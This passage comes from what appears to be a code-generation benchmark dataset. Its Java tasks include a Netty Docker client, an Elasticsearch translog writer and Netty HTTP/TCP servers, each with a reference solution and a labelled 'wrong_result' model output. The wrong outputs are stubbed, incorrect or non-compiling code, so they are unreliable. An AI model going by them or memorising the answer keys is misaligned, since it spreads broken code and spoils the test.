channel.writeAndFlush(Unpooled.copiedBuffer(line.getBytes()));\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }).start();\n\n            future.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    static class FileClientHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            System.out.println(\"Connected to server\");\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            String received = (String) msg;\n            System.out.println(\"Received: \" + received);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 155,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a Docker daemon, with support for SSL/TLS encryption and timeout handling.\n\nClass Description: The NettyTcpClient class provides functionality to establish and manage TCP connections to a Docker daemon using Netty framework. It handles connection initialization, SSL/TLS configuration, timeout management, and graceful shutdown.\n\nAttributes:\n- bootstrap: Bootstrap - Netty's client bootstrap for connection configuration\n- eventLoopGroup: EventLoopGroup - Manages client-side I/O threads\n- connectTimeout: Integer - Connection timeout in milliseconds\n- readTimeout: Integer - Read operation timeout in milliseconds\n- threadPrefix: String - Prefix for Netty thread names\n\nMethods:\n- init(DockerClientConfig dockerClientConfig) -> void - Initializes the Netty client with Docker configuration\n- connect(DockerClientConfig dockerClientConfig) -> DuplexChannel - Establishes connection to Docker daemon with SSL support\n- initSsl(DockerClientConfig dockerClientConfig) -> SslHandler - Configures SSL/TLS for the connection\n- enableHostNameVerification(SSLParameters sslParameters) -> SSLParameters - Enables hostname verification in SSL parameters\n- close() -> void - Shuts down the client gracefully\n- configure(T channel) -> T - Configures channel timeouts and handlers\n- ReadTimeoutHandler() -> void - Inner class handling read timeout events",
    "Canonical_solution": "import com.github.dockerjava.core.DockerClientConfig;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelConfig;\nimport io.netty.channel.ChannelFactory;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DuplexChannel;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpContentDecompressor;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.timeout.IdleState;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.DefaultThreadFactory;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.net.SocketTimeoutException;\nimport java.security.Security;\nimport java.util.Objects;\nimport java.util.concurrent.TimeUnit;\nimport javax.net.ssl.SSLEngine;\nimport javax.net.ssl.SSLParameters;\n\npublic class NettyTcpClient {\n\n    private static String threadPrefix = \"dockerjava-netty\";\n    private Bootstrap bootstrap;\n    private EventLoopGroup eventLoopGroup;\n    private Integer connectTimeout;\n    private Integer readTimeout;\n\n    public void init(DockerClientConfig dockerClientConfig) {\n        bootstrap = new Bootstrap();\n        eventLoopGroup = new NioEventLoopGroup(0, new DefaultThreadFactory(threadPrefix));\n\n        InetAddress addr = InetAddress.getLoopbackAddress();\n        final SocketAddress proxyAddress = new InetSocketAddress(addr, 8008);\n\n        Security.addProvider(new BouncyCastleProvider());\n\n        ChannelFactory<NioSocketChannel> factory = () -> configure(new NioSocketChannel());\n\n        bootstrap.group(eventLoopGroup).channelFactory(factory)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(final SocketChannel channel) throws Exception {\n                        channel.pipeline().addLast(new HttpClientCodec());\n                        channel.pipeline().addLast(new HttpContentDecompressor());\n                    }\n                });\n    }\n\n    public DuplexChannel connect(DockerClientConfig dockerClientConfig) throws InterruptedException {\n        String host = dockerClientConfig.getDockerHost().getHost();\n        int port = dockerClientConfig.getDockerHost().getPort();\n\n        if (port == -1) {\n            throw new RuntimeException(\"no port configured for \" + host);\n        }\n\n        final DuplexChannel channel = (DuplexChannel) bootstrap.connect(host, port).sync().channel();\n\n        final SslHandler ssl = initSsl(dockerClientConfig);\n\n        if (ssl != null) {\n            channel.pipeline().addFirst(ssl);\n            ssl.sslCloseFuture().addListener(future -> channel.eventLoop().execute(channel::close));\n        }\n\n        return channel;\n    }\n\n    private SslHandler initSsl(DockerClientConfig dockerClientConfig) {\n        SslHandler ssl = null;\n\n        try {\n            String host = dockerClientConfig.getDockerHost().getHost();\n            int port = dockerClientConfig.getDockerHost().getPort();\n\n            final SSLConfig sslConfig = dockerClientConfig.getSSLConfig();\n\n            if (sslConfig != null && sslConfig.getSSLContext() != null) {\n                SSLEngine engine = sslConfig.getSSLContext().createSSLEngine(host, port);\n                engine.setUseClientMode(true);\n                engine.setSSLParameters(enableHostNameVerification(engine.getSSLParameters()));\n                ssl = new SslHandler(engine);\n            }\n\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n\n        return ssl;\n    }\n\n    public SSLParameters enableHostNameVerification(SSLParameters sslParameters) {\n        sslParameters.setEndpointIdentificationAlgorithm(\"HTTPS\");\n        return sslParameters;\n    }\n\n    public void close() throws IOException {\n        Objects.requireNonNull(eventLoopGroup, \"Factory not initialized. You probably forgot to call init()!\");\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    private <T extends Channel> T configure(T channel) {\n        ChannelConfig channelConfig = channel.config();\n\n        if (connectTimeout != null) {\n            channelConfig.setConnectTimeoutMillis(connectTimeout);\n        }\n        if (readTimeout != null) {\n            channel.pipeline().addLast(\"readTimeoutHandler\", new ReadTimeoutHandler());\n        }\n\n        return channel;\n    }\n\n    private final class ReadTimeoutHandler extends IdleStateHandler {\n        private boolean alreadyTimedOut;\n\n        ReadTimeoutHandler() {\n            super(readTimeout, 0, 0, TimeUnit.MILLISECONDS);\n        }\n\n        @Override\n        protected synchronized void channelIdle(ChannelHandlerContext ctx, IdleStateEvent evt) throws Exception {\n            assert evt.state() == IdleState.READER_IDLE;\n            final Channel channel = ctx.channel();\n            if (channel == null || !channel.isActive() || alreadyTimedOut) {\n                return;\n            }\n            DockerClientConfig dockerClientConfig = getDockerClientConfig();\n            final Object dockerAPIEndpoint = dockerClientConfig.getDockerHost();\n            final String msg = \"Read timed out: No data received within \" + readTimeout\n                    + \"ms.  Perhaps the docker API (\" + dockerAPIEndpoint\n                    + \") is not responding normally, or perhaps you need to increase the readTimeout value.\";\n            final Exception ex = new SocketTimeoutException(msg);\n            ctx.fireExceptionCaught(ex);\n            alreadyTimedOut = true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.timeout.ReadTimeoutHandler;\nimport io.netty.handler.timeout.WriteTimeoutHandler;\nimport javax.net.ssl.SSLParameters;\n\npublic class NettyTcpClient {\n    private final Bootstrap bootstrap;\n    private final EventLoopGroup eventLoopGroup;\n    private final int connectTimeout;\n    private final int readTimeout;\n    private final String threadPrefix;\n\n    public NettyTcpClient(int connectTimeout, int readTimeout, String threadPrefix) {\n        this.connectTimeout = connectTimeout;\n        this.readTimeout = readTimeout;\n        this.threadPrefix = threadPrefix;\n        this.bootstrap = new Bootstrap();\n        this.eventLoopGroup = new NioEventLoopGroup();\n        bootstrap.group(eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, connectTimeout);\n    }\n\n    public void init(DockerClientConfig dockerClientConfig) {\n        // Initialization logic using dockerClientConfig\n    }\n\n    public DuplexChannel connect(DockerClientConfig dockerClientConfig) {\n        // Establish connection with SSL support\n        return null;\n    }\n\n    public SslHandler initSsl(DockerClientConfig dockerClientConfig) {\n        // Configure SSL/TLS for the connection\n        return null;\n    }\n\n    public SSLParameters enableHostNameVerification(SSLParameters sslParameters) {\n        // Enables hostname verification in SSL parameters\n        return sslParameters;\n    }\n\n    public void close() {\n        // Shuts down the client gracefully\n    }\n\n    public <T extends Channel> T configure(T channel) {\n        // Configures channel timeouts and handlers\n        return channel;\n    }\n\n    static class ReadTimeoutHandler {\n        // Inner class handling read timeout events\n    }\n}\n```"
  },
  {
    "Task_id": 16,
    "Instruction": "Task Description: Create a Java class that implements a transactional log writer for Elasticsearch, handling file operations using Java NIO's FileChannel for efficient I/O operations. The class should manage writing operations, buffer management, and resource cleanup.\n\nClass Description: TranslogWriter is a transactional log writer that extends BaseTranslogReader and implements Closeable. It provides functionality to write operations to a log file using FileChannel, manage buffers, and handle synchronization. The class includes mechanisms for checkpointing, thread-safe operations, and resource management.\n\nAttributes:\n- channel: [FileChannel] - The main file channel for writing transaction log entries\n- checkpointChannel: [FileChannel] - File channel for writing checkpoint information\n- checkpointPath: [Path] - Path to the checkpoint file\n- bigArrays: [BigArrays] - Helper for managing large arrays\n- totalOffset: [long] - Current offset in the log file\n- closed: [AtomicBoolean] - Flag indicating whether the writer is closed\n- writeLock: [ReleasableLock] - Lock for thread-safe write operations\n- syncLock: [Object] - Synchronization lock object\n- buffer: [ReleasableBytesStreamOutput] - Buffer for holding data before writing\n- globalCheckpointSupplier: [LongSupplier] - Supplier for global checkpoint information\n- minTranslogGenerationSupplier: [LongSupplier] - Supplier for minimum translog generation\n- persistedSequenceNumberConsumer: [LongConsumer] - Consumer for persisted sequence numbers\n\nMethods:\n- TranslogWriter([ShardId, Checkpoint, FileChannel, FileChannel, Path, Path, ByteSizeValue, LongSupplier, LongSupplier, TranslogHeader, TragicExceptionHolder, LongConsumer, BigArrays]) -> [void] - Constructor that initializes the translog writer with all required components\n- writeAndReleaseOps([ReleasableBytesReference]) -> [void] - Writes the given bytes reference to the file and releases it\n- writeToFile([ByteBuffer]) -> [void] - Helper method that writes buffer contents to the file channel\n- readBytes([ByteBuffer, long]) -> [void] - Reads bytes from the specified position into the target buffer\n- writeCheckpoint([FileChannel, Path, Checkpoint]) -> [void] - Static helper method to write checkpoint information\n- close() -> [void] - Closes all resources and marks the writer as closed",
    "Canonical_solution": "import java.io.Closeable;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.locks.ReentrantLock;\nimport java.util.function.LongConsumer;\nimport java.util.function.LongSupplier;\n\nimport org.apache.lucene.store.AlreadyClosedException;\nimport org.apache.lucene.util.BytesRef;\nimport org.apache.lucene.util.BytesRefIterator;\nimport org.elasticsearch.common.bytes.BytesArray;\nimport org.elasticsearch.common.bytes.BytesReference;\nimport org.elasticsearch.common.bytes.ReleasableBytesReference;\nimport org.elasticsearch.common.io.Channels;\nimport org.elasticsearch.common.io.DiskIoBufferPool;\nimport org.elasticsearch.common.lease.Releasables;\nimport org.elasticsearch.common.unit.ByteSizeValue;\nimport org.elasticsearch.common.util.BigArrays;\nimport org.elasticsearch.common.util.concurrent.ReleasableLock;\nimport org.elasticsearch.index.seqno.SequenceNumbers;\nimport org.elasticsearch.index.shard.ShardId;\n\nimport io.crate.common.SuppressForbidden;\nimport io.crate.common.io.IOUtils;\n\npublic class TranslogWriter extends BaseTranslogReader implements Closeable {\n\n    private final FileChannel channel;\n    private final FileChannel checkpointChannel;\n    private final Path checkpointPath;\n    private final BigArrays bigArrays;\n    private volatile long totalOffset;\n    private final AtomicBoolean closed = new AtomicBoolean(false);\n    private final ReleasableLock writeLock = new ReleasableLock(new ReentrantLock());\n    private final Object syncLock = new Object();\n    private ReleasableBytesStreamOutput buffer;\n    private final LongSupplier globalCheckpointSupplier;\n    private final LongSupplier minTranslogGenerationSupplier;\n    private final LongConsumer persistedSequenceNumberConsumer;\n\n    public TranslogWriter(\n        final ShardId shardId,\n        final Checkpoint initialCheckpoint,\n        final FileChannel channel,\n        final FileChannel checkpointChannel,\n        final Path path,\n        final Path checkpointPath,\n        final ByteSizeValue bufferSize,\n        final LongSupplier globalCheckpointSupplier,\n        LongSupplier minTranslogGenerationSupplier,\n        TranslogHeader header,\n        final TragicExceptionHolder tragedy,\n        final LongConsumer persistedSequenceNumberConsumer,\n        final BigArrays bigArrays) throws IOException {\n        super(initialCheckpoint.generation, channel, path, header);\n        this.channel = channel;\n        this.checkpointChannel = checkpointChannel;\n        this.checkpointPath = checkpointPath;\n        this.bigArrays = bigArrays;\n        this.totalOffset = initialCheckpoint.offset;\n        this.globalCheckpointSupplier = globalCheckpointSupplier;\n        this.minTranslogGenerationSupplier = minTranslogGenerationSupplier;\n        this.persistedSequenceNumberConsumer = persistedSequenceNumberConsumer;\n    }\n\n    private void writeAndReleaseOps(ReleasableBytesReference toWrite) throws IOException {\n        try (ReleasableBytesReference toClose = toWrite) {\n            assert writeLock.isHeldByCurrentThread();\n            ByteBuffer ioBuffer = DiskIoBufferPool.getIoBuffer();\n\n            BytesRefIterator iterator = toWrite.iterator();\n            BytesRef current;\n            while ((current = iterator.next()) != null) {\n                int currentBytesConsumed = 0;\n                while (currentBytesConsumed != current.length) {\n                    int nBytesToWrite = Math.min(current.length - currentBytesConsumed, ioBuffer.remaining());\n                    ioBuffer.put(current.bytes, current.offset + currentBytesConsumed, nBytesToWrite);\n                    currentBytesConsumed += nBytesToWrite;\n                    if (ioBuffer.hasRemaining() == false) {\n                        ioBuffer.flip();\n                        writeToFile(ioBuffer);\n                        ioBuffer.clear();\n                    }\n                }\n            }\n            ioBuffer.flip();\n            writeToFile(ioBuffer);\n        }\n    }\n\n    @SuppressForbidden(reason = \"Channel#write\")\n    private void writeToFile(ByteBuffer ioBuffer) throws IOException {\n        while (ioBuffer.remaining() > 0) {\n            channel.write(ioBuffer);\n        }\n    }\n\n    @Override\n    protected void readBytes(ByteBuffer targetBuffer, long position) throws IOException {\n        try {\n            if (position + targetBuffer.remaining() > getWrittenOffset()) {\n                writeBufferedOps(position + targetBuffer.remaining(), true);\n            }\n        } catch (final Exception ex) {\n            closeWithTragicEvent(ex);\n            throw ex;\n        }\n        Channels.readFromFileChannelWithEofException(channel, position, targetBuffer);\n    }\n\n    private static void writeCheckpoint(\n        final FileChannel fileChannel,\n        final Path checkpointFile,\n        final Checkpoint checkpoint) throws IOException {\n        Checkpoint.write(fileChannel, checkpointFile, checkpoint);\n    }\n\n    @Override\n    public final void close() throws IOException {\n        if (closed.compareAndSet(false, true)) {\n            synchronized (this) {\n                Releasables.closeIgnoringException(buffer);\n                buffer = null;\n            }\n            IOUtils.close(checkpointChannel, channel);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class TranslogWriter extends BaseTranslogReader implements Closeable {\n    private final FileChannel channel;\n    private final FileChannel checkpointChannel;\n    private final Path checkpointPath;\n    private final BigArrays bigArrays;\n    private long totalOffset;\n    private final AtomicBoolean closed;\n    private final ReleasableLock writeLock;\n    private final Object syncLock;\n    private final ReleasableBytesStreamOutput buffer;\n    private final LongSupplier globalCheckpointSupplier;\n    private final LongSupplier minTranslogGenerationSupplier;\n    private final LongConsumer persistedSequenceNumberConsumer;\n\n    public TranslogWriter(ShardId shardId, Checkpoint checkpoint, FileChannel channel, FileChannel checkpointChannel, Path checkpointPath, Path translogPath, ByteSizeValue translogSize, LongSupplier globalCheckpointSupplier, LongSupplier minTranslogGenerationSupplier, TranslogHeader header, TragicExceptionHolder tragicExceptionHolder, LongConsumer persistedSequenceNumberConsumer, BigArrays bigArrays) {\n        this.channel = channel;\n        this.checkpointChannel = checkpointChannel;\n        this.checkpointPath = checkpointPath;\n        this.bigArrays = bigArrays;\n        this.totalOffset = 0;\n        this.closed = new AtomicBoolean(false);\n        this.writeLock = new ReleasableLock();\n        this.syncLock = new Object();\n        this.buffer = new ReleasableBytesStreamOutput();\n        this.globalCheckpointSupplier = globalCheckpointSupplier;\n        this.minTranslogGenerationSupplier = minTranslogGenerationSupplier;\n        this.persistedSequenceNumberConsumer = persistedSequenceNumberConsumer;\n    }\n\n    public void writeAndReleaseOps(ReleasableBytesReference bytesRef) {\n        writeLock.acquire();\n        try {\n            buffer.write(bytesRef);\n            writeToFile(buffer.asByteBuffer());\n            buffer.release();\n        } finally {\n            writeLock.release();\n        }\n    }\n\n    private void writeToFile(ByteBuffer buffer) {\n        synchronized (syncLock) {\n            channel.write(buffer);\n            totalOffset += buffer.remaining();\n        }\n    }\n\n    private void readBytes(ByteBuffer target, long position) {\n        channel.position(position);\n        channel.read(target);\n        channel.position(position + target.remaining());\n    }\n\n    private static void writeCheckpoint(FileChannel channel, Path path, Checkpoint checkpoint) {\n        try {\n            channel.position(0);\n            channel.write(ByteBuffer.wrap(checkpoint.toString().getBytes()));\n            channel.force(MappedByteChannel.ForceMode.POSITION);\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n\n    @Override\n    public void close() {\n        if (closed.get()) {\n            return;\n        }\n        closed.set(true);\n        try {\n            channel.close();\n            checkpointChannel.close();\n            buffer.release();\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n}"
  },
  {
    "Task_id": 164,
    "Instruction": "Task Description: Create a Java class that implements an HTTP server using Netty framework, capable of handling HTTP requests with configurable thread pool settings and connection management.\n\nClass Description: Netty4HttpServer is a Netty-based HTTP server implementation that handles incoming HTTP requests using configurable worker threads and connection pooling. It extends AbstractServer and implements StatisticCallback for monitoring purposes.\n\nAttributes:\n- httpMessageHandler: HttpMessageHandler - Handler for processing HTTP requests\n- url: URL - Server configuration URL containing parameters like port, thread settings\n- channel: Channel - Netty channel for server communication\n- bossGroup: EventLoopGroup - Netty event loop group for accepting connections\n- workerGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- standardThreadExecutor: StandardThreadExecutor - Thread pool for request processing\n\nMethods:\n- open() -> boolean - Initializes and starts the HTTP server, returns true if successful\n  Input: None\n  Output: boolean indicating success/failure of server startup\n\n- close(int timeout) -> void - Shuts down the server gracefully within specified timeout\n  Input: timeout - maximum time to wait for shutdown (in milliseconds)\n  Output: None\n\n- processHttpRequest(ChannelHandlerContext ctx, FullHttpRequest httpRequest) -> void - Processes incoming HTTP requests\n  Input: \n    ctx - ChannelHandlerContext for the connection\n    httpRequest - Full HTTP request object\n  Output: None\n\n- sendResponse(ChannelHandlerContext ctx, FullHttpResponse httpResponse) -> void - Sends HTTP response to client\n  Input:\n    ctx - ChannelHandlerContext for the connection\n    httpResponse - Full HTTP response object\n  Output: None\n\n- getUrl() -> URL - Returns server configuration URL\n  Input: None\n  Output: URL object containing server configuration",
    "Canonical_solution": "import com.weibo.api.motan.common.ChannelState;\nimport com.weibo.api.motan.common.MotanConstants;\nimport com.weibo.api.motan.common.URLParamType;\nimport com.weibo.api.motan.core.DefaultThreadFactory;\nimport com.weibo.api.motan.core.StandardThreadExecutor;\nimport com.weibo.api.motan.exception.MotanFrameworkException;\nimport com.weibo.api.motan.rpc.Request;\nimport com.weibo.api.motan.rpc.Response;\nimport com.weibo.api.motan.rpc.URL;\nimport com.weibo.api.motan.transport.AbstractServer;\nimport com.weibo.api.motan.transport.TransportException;\nimport com.weibo.api.motan.util.LoggerUtil;\nimport com.weibo.api.motan.util.StatisticCallback;\nimport com.weibo.api.motan.util.StatsUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.stream.ChunkedWriteHandler;\n\nimport java.net.InetSocketAddress;\n\npublic class Netty4HttpServer extends AbstractServer implements StatisticCallback {\n    private HttpMessageHandler httpMessageHandler;\n    private URL url;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private StandardThreadExecutor standardThreadExecutor;\n\n    public Netty4HttpServer(URL url, HttpMessageHandler httpMessageHandler) {\n        this.url = url;\n        this.httpMessageHandler = httpMessageHandler;\n    }\n\n    @Override\n    public synchronized boolean open() {\n        if (isAvailable()) {\n            return true;\n        }\n        if (channel != null) {\n            channel.close();\n        }\n        if (bossGroup == null) {\n            bossGroup = new NioEventLoopGroup();\n            workerGroup = new NioEventLoopGroup();\n        }\n        boolean shareChannel = url.getBooleanParameter(URLParamType.shareChannel.getName(), URLParamType.shareChannel.getBooleanValue());\n        int workerQueueSize = url.getIntParameter(URLParamType.workerQueueSize.getName(), 500);\n\n        int minWorkerThread, maxWorkerThread;\n\n        if (shareChannel) {\n            minWorkerThread = url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MIN_WORKDER);\n            maxWorkerThread = url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MAX_WORKDER);\n        } else {\n            minWorkerThread =\n                    url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MIN_WORKDER);\n            maxWorkerThread =\n                    url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MAX_WORKDER);\n        }\n        final int maxContentLength = url.getIntParameter(URLParamType.maxContentLength.getName(), URLParamType.maxContentLength.getIntValue());\n        standardThreadExecutor = (standardThreadExecutor != null && !standardThreadExecutor.isShutdown()) ? standardThreadExecutor\n                : new StandardThreadExecutor(minWorkerThread, maxWorkerThread, workerQueueSize, new DefaultThreadFactory(\"NettyServer-\" + url.getServerPortStr(), true));\n        standardThreadExecutor.prestartAllCoreThreads();\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup).channel(NioServerSocketChannel.class).childHandler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) {\n                ch.pipeline().addLast(\"http-decoder\", new HttpRequestDecoder());\n                ch.pipeline().addLast(\"http-aggregator\", new HttpObjectAggregator(maxContentLength));\n                ch.pipeline().addLast(\"http-encoder\", new HttpResponseEncoder());\n                ch.pipeline().addLast(\"http-chunked\", new ChunkedWriteHandler());\n                ch.pipeline().addLast(\"serverHandler\", new SimpleChannelInboundHandler<FullHttpRequest>() {\n                    protected void channelRead0(final ChannelHandlerContext ctx, final FullHttpRequest httpRequest) {\n                        httpRequest.content().retain();\n                        try {\n                            standardThreadExecutor.execute(() -> processHttpRequest(ctx, httpRequest));\n                        } catch (Exception e) {\n                            LoggerUtil.error(\"request is rejected by threadPool!\", e);\n                            httpRequest.content().release();\n                            sendResponse(ctx, NettyHttpUtil.buildErrorResponse(\"request is rejected by thread pool!\"));\n                        }\n                    }\n                });\n            }\n        }).option(ChannelOption.SO_BACKLOG, 1024).childOption(ChannelOption.SO_KEEPALIVE, false);\n\n        ChannelFuture f;\n        try {\n            f = b.bind(url.getPort()).sync();\n            channel = f.channel();\n        } catch (InterruptedException e) {\n            LoggerUtil.error(\"init http server fail.\", e);\n            return false;\n        }\n        setLocalAddress((InetSocketAddress) channel.localAddress());\n        if (url.getPort() == 0) {\n            url.setPort(getLocalAddress().getPort());\n        }\n        state = ChannelState.ALIVE;\n        StatsUtil.registryStatisticCallback(this);\n        LoggerUtil.info(\"Netty4HttpServer ServerChannel finish Open: url=\" + url);\n        return true;\n    }\n\n    private void processHttpRequest(ChannelHandlerContext ctx, FullHttpRequest httpRequest) {\n        FullHttpResponse httpResponse;\n        try {\n            httpRequest.headers().set(URLParamType.host.getName(), ((InetSocketAddress) ctx.channel().remoteAddress()).getAddress().getHostAddress());\n            httpResponse = httpMessageHandler.handle(this, httpRequest);\n        } catch (Exception e) {\n            LoggerUtil.error(\"NettyHttpHandler process http request fail.\", e);\n            httpResponse = NettyHttpUtil.buildErrorResponse(e.getMessage());\n        } finally {\n            httpRequest.content().release();\n        }\n        sendResponse(ctx, httpResponse);\n    }\n\n    private void sendResponse(ChannelHandlerContext ctx, FullHttpResponse httpResponse) {\n        boolean close = false;\n        try {\n            ctx.write(httpResponse);\n            ctx.flush();\n        } catch (Exception e) {\n            LoggerUtil.error(\"NettyHttpHandler write response fail.\", e);\n            close = true;\n        } finally {\n            if (close || httpResponse == null || !httpResponse.headers().contains(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE, true)) {\n                ctx.close();\n            }\n        }\n    }\n\n    @Override\n    public synchronized void close(int timeout) {\n        if (state.isCloseState()) {\n            LoggerUtil.info(\"Netty4HttpServer close fail: already close, url={}\", url.getUri());\n            return;\n        }\n\n        if (state.isUnInitState()) {\n            LoggerUtil.info(\"Netty4HttpServer close Fail: don't need to close because node is unInit state: url={}\",\n                    url.getUri());\n            return;\n        }\n        if (channel != null) {\n            channel.close();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        if (standardThreadExecutor != null) {\n            standardThreadExecutor.shutdownNow();\n        }\n        workerGroup = null;\n        bossGroup = null;\n        standardThreadExecutor = null;\n        channel = null;\n        state = ChannelState.CLOSE;\n        StatsUtil.unRegistryStatisticCallback(this);\n    }\n\n    @Override\n    public URL getUrl() {\n        return url;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class Netty4HttpServer extends AbstractServer implements StatisticCallback {\n    private final HttpMessageHandler httpMessageHandler;\n    private final URL url;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private StandardThreadExecutor standardThreadExecutor;\n\n    public Netty4HttpServer(HttpMessageHandler handler, URL configUrl) {\n        this.httpMessageHandler = handler;\n        this.url = configUrl;\n    }\n\n    public boolean open() {\n        try {\n            int port = url.getPort();\n            int bossThreads = parseBossThreadsFromUrl(url);\n            int workerThreads = parseWorkerThreadsFromUrl(url);\n            int executorThreads = parseExecutorThreadsFromUrl(url);\n\n            bossGroup = new NioEventLoopGroup(bossThreads);\n            workerGroup = new NioEventLoopGroup(workerThreads);\n            standardThreadExecutor = new ThreadPoolExecutor(executorThreads, executorThreads, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<Runnable>());\n\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(httpMessageHandler);\n                 }\n             })\n             .childOption(ChannelOption.SO_REUSEADDR, true)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            channel = b.bind(port).sync();\n            return true;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public void close(int timeout) {\n        if (channel != null) {\n            channel.closeFuture().awaitUninterruptibly(timeout);\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        if (standardThreadExecutor != null) {\n            standardThreadExecutor.shutdown();\n        }\n    }\n\n    public void processHttpRequest(ChannelHandlerContext ctx, FullHttpRequest httpRequest) {\n        httpMessageHandler.processRequest(ctx, httpRequest);\n    }\n\n    public void sendResponse(ChannelHandlerContext ctx, FullHttpResponse httpResponse) {\n        ctx.write(httpResponse);\n        ctx.flush();\n    }\n\n    public URL getUrl() {\n        return url;\n    }\n\n    private int parsePortFromUrl(URL url) {\n        return url.getPort() == -1 ? 8080 : url.getPort();\n    }\n\n    private int parseBossThreadsFromUrl(URL url) {\n        String query = url.getQuery();\n        if (query == null || query.isEmpty()) return 1;\n        String[] params = query.split(\"&\");\n        for (String param : params) {\n            if (param.startsWith(\"boss=\")) {\n                return Integer.parseInt(param.substring(5));\n            }\n        }\n        return 1;\n    }\n\n    private int parseWorkerThreadsFromUrl(URL url) {\n        String query = url.getQuery();\n        if (query == null || query.isEmpty()) return 16;\n        String[] params = query.split(\"&\");\n        for (String param : params) {\n            if (param.startsWith(\"worker=\")) {\n                return Integer.parseInt(param.substring(7));\n            }\n        }\n        return 16;\n    }\n\n    private int parseExecutorThreadsFromUrl(URL url) {\n        String query = url.getQuery();\n        if (query == null || query.isEmpty()) return 5;\n        String[] params = query.split(\"&\");\n        for (String param : params) {\n            if (param.startsWith(\"executor=\")) {\n                return Integer.parseInt(param.substring(9));\n            }\n        }\n        return 5;\n    }\n}"
  },
  {
    "Task_id": 167,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process requests.\n\nClass Description: DiscardServer is a Netty-based TCP server that listens on a specified port, accepts incoming connections, and processes client requests using a custom handler. The server uses non-blocking I/O and is designed to be gracefully shutdown when no longer needed.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nDiscardServer: (int port) -> void - Constructor that initializes the server with the specified port number\nrun: () -> void - Starts the server, binds it to the configured port, and begins accepting connections. Throws Exception if any error occurs during startup\nmain: (String[] args) -> void - Entry point that creates and starts the server instance with either a specified port or default port 8080",
